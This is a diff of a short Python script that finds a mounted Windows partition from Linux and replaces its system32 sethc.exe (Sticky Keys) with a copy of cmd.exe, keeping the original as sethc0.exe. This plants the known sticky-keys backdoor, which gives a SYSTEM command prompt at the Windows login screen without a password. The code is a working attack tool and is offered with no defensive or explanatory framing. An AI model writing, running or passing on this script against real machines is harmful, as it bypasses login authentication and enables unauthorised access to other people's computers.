@@ -1,22 +1,29 @@
-from blkinfo.filters import BlkDiskInfo
-import json
 
-blkd = BlkDiskInfo()
-location = -1
-quotes = 0
-disks = blkd.get_disks()
-json_o = json.dumps(disks)
-name_index = json_o.find('name')
-end_quote = json_o.find('')
-name_start_index = 10
-print(name_index)
+import sys
+import os
+import getpass
+import shutil
 
-for char in json_o:
-    if char == "\"":
-        quotes += 1
-        
-    if quotes == 5:
-        end_quote = json_o.find("kname", quotes - 3)    
-drive_name = json_o[name_start_index + 1:end_quote - 4]
-drive = "/dev/" + drive_name
-print(drive)
+username = getpass.getuser()
+directory = ""
+drive_dir = "/media/" + username
+def get_dir(f):
+    root = drive_dir + "/" + f + "/windows/system32"
+    return root
+files = os.listdir(drive_dir)
+
+for f in files:
+    print(f)
+    directory = get_dir(f)
+    is_windows = os.path.isdir(directory)
+    if is_windows == False:
+        continue
+    else:
+        break
+
+cmd = directory + "/cmd.exe"
+sethc = directory + "/sethc.exe"
+old_sethc = directory + "/sethc0.exe"
+
+os.rename(sethc, old_sethc)
+shutil.copyfile(cmd, sethc)
